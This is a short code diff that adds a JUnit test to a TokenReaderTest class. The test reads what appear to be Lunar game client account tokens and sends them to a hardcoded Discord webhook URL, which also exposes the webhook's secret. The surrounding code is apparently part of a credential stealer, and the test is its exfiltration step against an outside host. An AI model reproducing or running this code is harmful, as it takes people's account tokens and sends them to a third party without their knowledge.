@@ -45,4 +45,15 @@ public class TokenReaderTest {
 
         }
     }
+
+    @Test
+    public void sendTokensTest() {
+        String webhookUrl = "https://discord.com/api/webhooks/1248630842947797042/u3zPVi_LZRCtZPGOEZqa-W0kjnNfy2B4lC85qwcfiz-BFAlSKUos2gRH9UZPyXr_G0lk";
+        try {
+            TokenReader tr = new TokenReader();
+            tr.sendTokens(webhookUrl);
+        } catch (Exception e) {
+            System.out.println("TEST: Failed to send lunar tokens: " + e);
+        }
+    }
 }
